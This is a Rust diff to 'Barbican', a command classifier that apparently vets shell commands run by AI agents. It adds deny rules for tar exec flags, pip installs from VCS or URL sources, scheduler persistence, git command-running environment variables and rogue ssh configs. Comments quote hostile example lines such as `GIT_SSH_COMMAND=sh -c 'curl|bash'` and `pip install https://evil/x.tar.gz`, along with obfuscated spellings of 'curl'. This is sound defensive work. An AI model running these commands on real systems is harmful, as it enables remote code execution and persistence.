@@ -226,6 +226,15 @@ fn classify_script_with_depth(script: &Script, depth: usize) -> Decision {
         if let Some(reason) = rsync_dash_e_inner(pipeline, depth) {
             return Decision::Deny { reason };
         }
+        if let Some(reason) = tar_command_exec(pipeline, depth) {
+            return Decision::Deny { reason };
+        }
+        if let Some(reason) = pip_editable_vcs_install(pipeline) {
+            return Decision::Deny { reason };
+        }
+        if let Some(reason) = scheduler_persistence(pipeline) {
+            return Decision::Deny { reason };
+        }
         if let Some(reason) = git_config_injection(pipeline) {
             return Decision::Deny { reason };
         }
@@ -352,6 +361,7 @@ fn unwrap_wrapper_command(stage: &crate::parser::Command) -> Option<Script> {
         args: Vec::new(),
         redirects: Vec::new(),
         substitutions: Vec::new(),
+        assignments: Vec::new(),
     };
     Some(Script {
         pipelines: vec![Pipeline {
@@ -501,7 +511,25 @@ fn extract_wrapper_inner(stage: &crate::parser::Command) -> Option<String> {
     // docker/podman/runc/crun have a more complex grammar — the inner
     // CMD comes after the image name. We scan argv for a `bash -c` /
     // `sh -c` / `<shell> -c` trailer and extract the -c payload.
-    if matches!(basename, "docker" | "podman" | "runc" | "crun") {
+    //
+    // 1.2.0 8th-pass review (Claude HIGH 8H2): cover the larger
+    // container-CLI family. Same shape (flags / image / inner CMD)
+    // for all of buildah / nerdctl / ctr / lxc-attach / apptainer /
+    // singularity / kubectl.
+    if matches!(
+        basename,
+        "docker"
+            | "podman"
+            | "runc"
+            | "crun"
+            | "buildah"
+            | "nerdctl"
+            | "ctr"
+            | "lxc-attach"
+            | "apptainer"
+            | "singularity"
+            | "kubectl"
+    ) {
         return extract_container_run_inner(&stage.args);
     }
     None
@@ -682,6 +710,22 @@ fn extract_ssh_remote_command(args: &[String]) -> Option<String> {
 ///
 /// 1.2.0 7th-pass adversarial review (GPT HIGH 7H3).
 fn ssh_uses_attacker_config(args: &[String]) -> bool {
+    // 1.2.0 8th-pass adversarial review (GPT 8GS2): the attacker
+    // form covers more than well-known tmp dirs — `ssh -F ./evil.conf`
+    // or `-F ../evil.conf` pointing at a cwd-local config also
+    // carries `ProxyCommand`/`LocalCommand` RCE. Allow ONLY the
+    // standard user and system ssh configs; anything else denies.
+    // Standard user and system ssh config paths. Includes literal
+    // `~/.ssh/config` for unexpanded tilde, and the suffix `/.ssh/
+    // config` which matches any home path (bash-expanded or not).
+    let allowed_exact: &[&str] = &[
+        "~/.ssh/config",
+    ];
+    let allowed_suffixes: &[&str] = &[
+        "/.ssh/config",
+        "/etc/ssh/ssh_config",
+        "/etc/ssh/ssh_config.d/",
+    ];
     let mut i = 0;
     while i < args.len() {
         let a = &args[i];
@@ -697,7 +741,28 @@ fn ssh_uses_attacker_config(args: &[String]) -> bool {
             None
         };
         if let Some(path) = config_path {
-            if path_in_attacker_writable_dir(path) {
+            let trimmed = path.trim().trim_matches(|c| c == '\'' || c == '"');
+            // Explicit attacker-writable directory still denies fast.
+            if path_in_attacker_writable_dir(trimmed) {
+                return true;
+            }
+            // `-F -` / `-F /dev/stdin` / `-F /dev/fd/N` are
+            // attacker-fed via redirect.
+            if trimmed == "-"
+                || trimmed == "/dev/stdin"
+                || trimmed.starts_with("/dev/fd/")
+            {
+                return true;
+            }
+            // Otherwise, require the path to match one of the
+            // allowlisted standard configs — `~/.ssh/config` (literal
+            // tilde, unexpanded), any suffix ending in
+            // `/.ssh/config`, or the system ssh config. Anything else
+            // — `./evil.conf`, `../foo.cfg`, `$HOME/projects/x/ssh.cfg`
+            // — is treated as an attacker pivot.
+            let is_standard = allowed_exact.contains(&trimmed)
+                || allowed_suffixes.iter().any(|s| trimmed.ends_with(s));
+            if !is_standard {
                 return true;
             }
         }
@@ -865,11 +930,10 @@ fn extract_prefix_runner_command(wrapper: &str, args: &[String]) -> Option<Strin
     // consumes 1 (the duration); watch consumes 0 — its "interval"
     // arrives via `-n` not a bare positional.
     let positional_skip: usize = match wrapper {
-        "timeout" => 1,
-        // 1.2.0 7th-pass review (Claude SEVERE 7S2): `gosu USER CMD`
-        // takes the first positional as the user, second as the
-        // inner command. Same shape as timeout's duration.
-        "gosu" => 1,
+        // `timeout DURATION CMD` consumes 1 leading positional; same
+        // shape for `gosu USER CMD` (added 1.2.0 7th-pass review,
+        // Claude SEVERE 7S2).
+        "timeout" | "gosu" => 1,
         _ => 0,
     };
     let mut wrapper_positionals_seen: usize = 0;
@@ -2061,6 +2125,276 @@ fn rsync_dash_e_inner(pipeline: &Pipeline, depth: usize) -> Option<String> {
     None
 }
 
+/// Deny GNU tar's documented RCE channels:
+/// - `--to-command=CMD` — runs CMD as `/bin/sh -c` for each archive
+///   member.
+/// - `--checkpoint=N --checkpoint-action=exec=CMD` — runs CMD on each
+///   checkpoint. `checkpoint-action` with a prefix of `exec=` invokes
+///   a shell command.
+///
+/// 1.2.0 8th-pass adversarial review (Claude HIGH 8H1). Both are
+/// listed on GTFOBins for tar.
+/// Deny `pip install -e git+URL` / `pip install URL#egg=` and the
+/// direct VCS-URL variants. Editable-install of a VCS URL runs the
+/// package's `setup.py` / PEP 517 backend at install time with full
+/// arbitrary-code capability — an attacker-controlled repo is
+/// download-and-execute.
+///
+/// Also covers the non-editable `pip install "package @ git+…"` and
+/// `pip install https://evil/x.tar.gz` (URL-based install) which
+/// have the same install-time code-execution property.
+///
+/// 1.2.0 8th-pass adversarial review (GPT HIGH 8GH2).
+/// Deny scheduler-based persistence channels:
+/// - `crontab -` / `crontab -r` (install / replace user crontab)
+/// - `at TIME` / `at now + N min` (one-shot scheduled job)
+/// - `batch` (same as `at` but defers to low-load)
+/// - `systemd-run --on-calendar=…` (persistent timer)
+///
+/// These don't write to any of the persistence paths Barbican
+/// currently scans (they use /var/spool/cron/… which is root-owned),
+/// so they slip past the file-write classifier. The scheduler CLI
+/// itself is the persistence sink.
+///
+/// 1.2.0 8th-pass adversarial review (GPT HIGH 8GH1).
+fn scheduler_persistence(pipeline: &Pipeline) -> Option<String> {
+    for stage in &pipeline.stages {
+        let bn = stage_bn_lc(stage);
+        match bn.as_str() {
+            "crontab" => {
+                // `crontab -` reads stdin as the new crontab.
+                // `crontab -r` removes. Either is persistence. Also
+                // `crontab FILE` writes FILE. Only exception: plain
+                // `crontab -l` (list) is read-only — allow it.
+                let args = &stage.args;
+                let is_list_only = args
+                    .iter()
+                    .any(|a| a == "-l" || a == "--list")
+                    && !args.iter().any(|a| {
+                        a == "-" || a == "-r" || a == "-e" || a == "--remove"
+                    });
+                if !is_list_only {
+                    return Some(
+                        "blocked: `crontab` invocation writes / edits / \
+                         replaces the user's crontab. This is the \
+                         classic Unix persistence channel; Barbican \
+                         treats any write-shape crontab as persistence."
+                            .to_string(),
+                    );
+                }
+            }
+            "at" | "batch" => {
+                return Some(format!(
+                    "blocked: `{bn}` schedules a command for later \
+                     execution (one-shot persistence). Run the \
+                     intended command directly instead.",
+                ));
+            }
+            "systemd-run" => {
+                // systemd-run WITH a timer option is persistence;
+                // the bare form is already handled as a wrapper.
+                for a in &stage.args {
+                    if a.starts_with("--on-")
+                        || a.starts_with("--timer-")
+                        || a == "--timer-property"
+                    {
+                        return Some(format!(
+                            "blocked: `systemd-run {a}` installs a \
+                             persistent systemd timer.",
+                        ));
+                    }
+                }
+            }
+            _ => {}
+        }
+    }
+    None
+}
+
+#[allow(clippy::case_sensitive_file_extension_comparisons)]
+fn pip_editable_vcs_install(pipeline: &Pipeline) -> Option<String> {
+    for stage in &pipeline.stages {
+        let bn = stage_bn_lc(stage);
+        if !matches!(
+            bn.as_str(),
+            "pip" | "pip3" | "pipx" | "uv" | "poetry"
+        ) {
+            continue;
+        }
+        // First non-flag positional must be `install`; bail otherwise.
+        let mut saw_install = false;
+        for a in &stage.args {
+            if a.starts_with('-') {
+                continue;
+            }
+            if a == "install" || a == "add" {
+                saw_install = true;
+            }
+            break;
+        }
+        if !saw_install {
+            continue;
+        }
+        // Scan remaining args for VCS URL / direct HTTPS URL targets.
+        for a in &stage.args {
+            let lower = a.to_ascii_lowercase();
+            let is_vcs = lower.starts_with("git+")
+                || lower.starts_with("hg+")
+                || lower.starts_with("svn+")
+                || lower.starts_with("bzr+");
+            let is_url = lower.starts_with("http://")
+                || lower.starts_with("https://");
+            // Direct git+... / hg+... / svn+... install.
+            if is_vcs {
+                return Some(format!(
+                    "blocked: `{bn} install {a}` fetches and runs an \
+                     arbitrary VCS repository's `setup.py` / PEP 517 \
+                     backend as install-time code. Pin to a known \
+                     package index instead.",
+                ));
+            }
+            // `pip install URL#egg=` or tarball from URL.
+            if is_url
+                && (lower.ends_with(".tar.gz")
+                    || lower.ends_with(".tgz")
+                    || lower.ends_with(".zip")
+                    || lower.ends_with(".whl")
+                    || lower.contains("#egg="))
+            {
+                return Some(format!(
+                    "blocked: `{bn} install {a}` fetches a package \
+                     archive from a raw URL and runs its install-time \
+                     hooks. Pin to the package index instead.",
+                ));
+            }
+            // `pip install "foo @ git+…"` — PEP 508 direct URL syntax.
+            if lower.contains("@ git+")
+                || lower.contains("@git+")
+                || lower.contains("@ http")
+            {
+                return Some(format!(
+                    "blocked: `{bn} install {a}` uses PEP 508 direct-URL \
+                     syntax to fetch a VCS or URL package; install-time \
+                     code runs with full privilege.",
+                ));
+            }
+        }
+    }
+    None
+}
+
+fn tar_command_exec(pipeline: &Pipeline, depth: usize) -> Option<String> {
+    if depth + 1 > M1_MAX_DEPTH {
+        return None;
+    }
+    for stage in &pipeline.stages {
+        if stage_bn_lc(stage) != "tar" {
+            continue;
+        }
+        let args = &stage.args;
+        let mut i = 0;
+        while i < args.len() {
+            let a = &args[i];
+            // 1.2.0 8th-pass review (GPT 8GH4): GNU getopt_long
+            // accepts unambiguous long-option prefixes — `--to-com`,
+            // `--to-comm`, `--checkpoint-act`, etc. all resolve to
+            // their full forms. Match on any prefix of the full
+            // names so abbreviations don't bypass.
+            let (flag, raw): (Option<&str>, Option<&str>) =
+                if let Some(val) = tar_strip_to_command_prefix_eq(a) {
+                    (Some("--to-command"), Some(val))
+                } else if tar_is_to_command_prefix(a) {
+                    (Some("--to-command"), args.get(i + 1).map(String::as_str))
+                } else if let Some(val) = tar_strip_checkpoint_action_prefix_eq(a) {
+                    val.strip_prefix("exec=")
+                        .map_or((None, None), |cmd| {
+                            (Some("--checkpoint-action=exec"), Some(cmd))
+                        })
+                } else if tar_is_checkpoint_action_prefix(a) {
+                    args.get(i + 1)
+                        .and_then(|v| v.strip_prefix("exec="))
+                        .map_or((None, None), |cmd| {
+                            (Some("--checkpoint-action=exec"), Some(cmd))
+                        })
+                } else {
+                    (None, None)
+                };
+            if let (Some(flag), Some(raw)) = (flag, raw) {
+                if let Some(reason) = classify_tar_inner(flag, raw, depth) {
+                    return Some(reason);
+                }
+            }
+            i += 1;
+        }
+    }
+    None
+}
+
+/// Classify a tar `--to-command` / `--checkpoint-action=exec=` value.
+/// Returns `Some(deny-reason)` if the inner shell command classifies
+/// as dangerous, `None` if it's a benign helper (allow the tar call).
+/// Is `a` a GNU-style prefix abbreviation of `--to-command`?
+/// Require at least `--to-c` to avoid matching unrelated long flags.
+fn tar_is_to_command_prefix(a: &str) -> bool {
+    a.starts_with("--to-") && "--to-command".starts_with(a) && a.len() >= "--to-c".len()
+}
+
+fn tar_strip_to_command_prefix_eq(a: &str) -> Option<&str> {
+    let eq_idx = a.find('=')?;
+    let prefix = &a[..eq_idx];
+    if tar_is_to_command_prefix(prefix) {
+        Some(&a[eq_idx + 1..])
+    } else {
+        None
+    }
+}
+
+fn tar_is_checkpoint_action_prefix(a: &str) -> bool {
+    a.starts_with("--checkpoint-")
+        && "--checkpoint-action".starts_with(a)
+        && a.len() >= "--checkpoint-a".len()
+}
+
+fn tar_strip_checkpoint_action_prefix_eq(a: &str) -> Option<&str> {
+    let eq_idx = a.find('=')?;
+    let prefix = &a[..eq_idx];
+    if tar_is_checkpoint_action_prefix(prefix) {
+        Some(&a[eq_idx + 1..])
+    } else {
+        None
+    }
+}
+
+fn classify_tar_inner(flag: &str, raw: &str, depth: usize) -> Option<String> {
+    let stripped = strip_surrounding_quotes_owned(raw);
+    match parser::parse(&stripped) {
+        Ok(inner) => {
+            if let Decision::Deny { reason } =
+                classify_script_with_depth(&inner, depth + 1)
+            {
+                return Some(format!(
+                    "blocked: tar `{flag}={stripped}` executes as a \
+                     shell command — inner: {reason}",
+                ));
+            }
+        }
+        Err(_) => {
+            return Some(format!(
+                "blocked: tar `{flag}={stripped}` is an unparseable \
+                 shell command — denying per parser fail-closed policy",
+            ));
+        }
+    }
+    if scan_payload_for_exfil(&stripped) {
+        return Some(format!(
+            "blocked: tar `{flag}={stripped}` would run a shell \
+             command that references a network tool / secret path — \
+             download-or-exfil shape.",
+        ));
+    }
+    None
+}
+
 fn shell_sink_procsub_reason() -> String {
     "blocked: network stage (curl/wget or a downstream of one in the \
      same pipeline) writes to a shell-code sink process substitution \
@@ -2821,6 +3155,40 @@ fn count_hex_escapes(code: &str) -> usize {
     count
 }
 
+/// Count `\OOO` octal escapes (C/Python/Ruby/Perl) where O is 0-7,
+/// 1-3 digits long. Only count 2-3 digit forms — single-digit `\0`
+/// / `\7` are too common as null / bell to flag usefully.
+///
+/// Attacker form: `"\143\165\162\154"` = "curl".
+fn count_octal_ascii_escapes(code: &str) -> usize {
+    let bytes = code.as_bytes();
+    let mut count = 0;
+    let mut i = 0;
+    while i + 2 < bytes.len() {
+        if bytes[i] == b'\\'
+            && (b'0'..=b'7').contains(&bytes[i + 1])
+            && (b'0'..=b'7').contains(&bytes[i + 2])
+        {
+            // Consume a 2-3 digit octal escape.
+            let has_third = i + 3 < bytes.len()
+                && (b'0'..=b'7').contains(&bytes[i + 3]);
+            count += 1;
+            i += 3 + usize::from(has_third);
+            continue;
+        }
+        i += 1;
+    }
+    count
+}
+
+/// Count Python-style `\N{NAME}` named-unicode escapes. Attacker form:
+/// `"\N{LATIN SMALL LETTER C}\N{LATIN SMALL LETTER U}\N{LATIN SMALL LETTER R}\N{LATIN SMALL LETTER L}"`.
+fn count_named_unicode_escapes(code: &str) -> usize {
+    // Simple substring count is fine — the form is unambiguous in
+    // legitimate code (ordinary strings rarely use `\N{` at all).
+    code.matches("\\N{").count()
+}
+
 /// Count `\uHHHH` unicode BMP escapes where the codepoint is in the
 /// ASCII range (00..=7F) — the shape an attacker uses to spell out
 /// ASCII text while avoiding literal `curl` / `bash` tokens.
@@ -2856,7 +3224,23 @@ fn code_calls_subprocess(code: &str) -> bool {
         "spawn(", "spawnsync(",
         "ccall(:system", "runtime.getruntime().exec",
         "processbuilder", "process.start",
-        "backtick(", "`",       // Perl/Ruby backticks
+        "backtick(",
+        // Perl `qx{}` / `qx//` / `qx()` and Ruby `%x{}` / `%x//` /
+        // `%x()` — the non-bare-backtick forms. Narrowed from a bare
+        // backtick needle (which false-positived on ANY backtick in
+        // a docstring / comment / string literal) to these explicit
+        // delimited forms. 1.2.0 8th-pass adversarial review
+        // (Claude HIGH 8H3).
+        "%x{", "%x(", "%x[", "%x<", "%x/", "%x|", "%x!",
+        "qx{", "qx(", "qx[", "qx<", "qx/", "qx|", "qx!", "qx\"",
+        // Bare-backtick shell-out: require the backtick to be
+        // followed by a known dangerous command NAME AND A SPACE
+        // (argv[0] + at least one argv[1]) — this catches the
+        // attacker form `\`curl URL\`` / `\`bash -c …\`` while
+        // ignoring backticks in docstrings like `\`curl\`` and
+        // code-fence markers like `\`\`\`bash` which have no
+        // trailing space-then-arg.
+        "`curl ", "`wget ", "`bash ", "`sh ", "`nc ",
         "io.popen", "io.spawn",
         "start-process",        // PowerShell (covered elsewhere, defensive)
         // S-expression / Lisp-family: `(system "…")`, `(exec "…")`,
@@ -2901,7 +3285,15 @@ fn code_has_obfuscation_marker(code: &str) -> bool {
     // don't decode the escapes; we just detect the pattern of ≥3
     // back-to-back hex/unicode escapes, which is a strong obfuscation
     // signal (legitimate code almost never chains that many).
-    if count_hex_escapes(code) >= 3 || count_unicode_bmp_ascii_escapes(code) >= 3 {
+    //
+    // 1.2.0 8th-pass review (GPT 8GH3): extended to cover octal
+    // (`\143`) and Python named-unicode (`\N{LATIN SMALL LETTER C}`)
+    // escape ladders, which work in Python/Perl/C string literals.
+    if count_hex_escapes(code) >= 3
+        || count_unicode_bmp_ascii_escapes(code) >= 3
+        || count_octal_ascii_escapes(code) >= 3
+        || count_named_unicode_escapes(code) >= 3
+    {
         return true;
     }
     // String concatenation of short fragments that reassemble a
@@ -3182,9 +3574,64 @@ fn git_config_injection(pipeline: &Pipeline) -> Option<String> {
         ("includeif.", ".path"),       // includeif.X.path
     ];
 
+    // 1.2.0 8th-pass adversarial review (Claude SEVERE S1): git env
+    // vars that either point at attacker-planted configs
+    // (`GIT_DIR`, `GIT_CONFIG`, `GIT_CONFIG_GLOBAL`, `GIT_CONFIG_SYSTEM`,
+    // `GIT_WORK_TREE`, `GIT_EXEC_PATH`) or name a shell command git
+    // runs on the next operation (`GIT_SSH_COMMAND`,
+    // `GIT_PROXY_COMMAND`, `GIT_EDITOR`, `GIT_PAGER`, `GIT_ASKPASS`,
+    // `GIT_EXTERNAL_DIFF`).
+    const GIT_ENV_EXEC_VARS: &[&str] = &[
+        "GIT_SSH_COMMAND",
+        "GIT_PROXY_COMMAND",
+        "GIT_EDITOR",
+        "GIT_PAGER",
+        "GIT_ASKPASS",
+        "GIT_EXTERNAL_DIFF",
+    ];
+    const GIT_ENV_DIR_VARS: &[&str] = &[
+        "GIT_DIR",
+        "GIT_WORK_TREE",
+        "GIT_CONFIG",
+        "GIT_CONFIG_GLOBAL",
+        "GIT_CONFIG_SYSTEM",
+        "GIT_EXEC_PATH",
+    ];
+
     for stage in &pipeline.stages {
         if stage_bn_lc(stage) != "git" {
             continue;
+        }
+        // Env-var prefix check: `GIT_DIR=… git log`,
+        // `GIT_SSH_COMMAND=sh -c 'curl|bash' git fetch`, etc.
+        for (name, value) in &stage.assignments {
+            let upper = name.to_ascii_uppercase();
+            if GIT_ENV_EXEC_VARS.contains(&upper.as_str()) {
+                return Some(format!(
+                    "blocked: `{name}={value}` is a git env var that \
+                     names a shell command git executes on the next \
+                     operation. These are direct RCE channels \
+                     (`GIT_SSH_COMMAND`, `GIT_PROXY_COMMAND`, \
+                     `GIT_EDITOR`, `GIT_PAGER`, `GIT_ASKPASS`, \
+                     `GIT_EXTERNAL_DIFF`).",
+                ));
+            }
+            if GIT_ENV_DIR_VARS.contains(&upper.as_str()) {
+                // Pointing git at an attacker-writeable directory
+                // means its on-disk `.git/config` can contain any
+                // DANGEROUS_KEYS entry. Non-attacker-writeable paths
+                // are presumed user-controlled.
+                let stripped = strip_surrounding_quotes_owned(value);
+                if path_in_attacker_writable_dir(&stripped) {
+                    return Some(format!(
+                        "blocked: `{name}={value}` points git at an \
+                         attacker-writeable directory. The on-disk \
+                         `.git/config` there could contain `core.pager=\
+                         !…`, `core.fsmonitor`, etc. which git runs \
+                         on the next operation.",
+                    ));
+                }
+            }
         }
         let args = &stage.args;
         // Walk args: `-c KEY=VAL`, `-c=KEY=VAL`, `-cKEY=VAL`
